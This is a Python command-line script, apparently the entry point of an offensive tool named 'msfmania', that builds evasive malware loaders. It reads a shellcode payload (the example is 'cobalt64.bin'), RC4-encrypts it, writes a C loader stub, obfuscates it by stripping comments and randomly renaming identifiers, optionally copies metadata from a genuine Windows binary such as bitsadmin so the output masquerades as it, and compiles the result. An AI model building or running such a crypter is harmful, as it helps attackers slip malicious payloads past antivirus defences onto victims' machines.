from msfmania import compiler, core, encryption, obfuscator, builder, utils
import argparse 

if __name__ == '__main__':
    core.banner()

    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--payload", help="Select the payload file to use (ex: cobalt64.bin)", required=True)
    parser.add_argument("-o", "--output", help="Output path including filename (ex: /path/to/output/payload)", required=True)
    parser.add_argument("-k", "--keysize", help="RC4 key size in bytes (1-3)", type=int, choices=[1, 2, 3], default=1)
    parser.add_argument("-s", "--strip", help="Strip the executable", action="store_true")
    parser.add_argument("--spoof-bin", help="Spoof binary metadata from target executable (ex: assets/bins/bitsadmin_11-21H2_KB5032192.exe)", metavar="TARGET_EXE")
    args = parser.parse_args()

    output_path = args.output
    payload = open(args.payload, "rb").read()
    encrypted_shellcode, payload_hash, salt = encryption.shellcode_encryption(payload, args.keysize)
    
    stub_path = "/tmp/main.c"
    builder.create_stub(stub_path, encrypted_shellcode, payload_hash, salt, args.keysize)
    
    obfuscator.remove_comments_from_file(stub_path)
    # obfuscator.remove_console_outputs_from_file(stub_path)
    
    # Rename user-defined identifiers
    with open(stub_path, 'r') as f:
        content = f.read()
    
    # Find user-defined functions and variables
    user_functions = obfuscator.find_user_defined_functions(content)
    user_variables = obfuscator.find_user_defined_variables(content)
    all_identifiers = user_functions.union(user_variables)
    
    # Generate random mappings and rename
    if all_identifiers:
        mappings = obfuscator.generate_random_mappings(all_identifiers)
        obfuscator.rename_identifiers_in_file(stub_path, mappings)
    
    resource_info = None
    if args.spoof_bin:
        resource_info = utils.extract_binary_metadata(args.spoof_bin)
    
    compiler.compile(stub_path, output_path, args.strip, resource_info)
    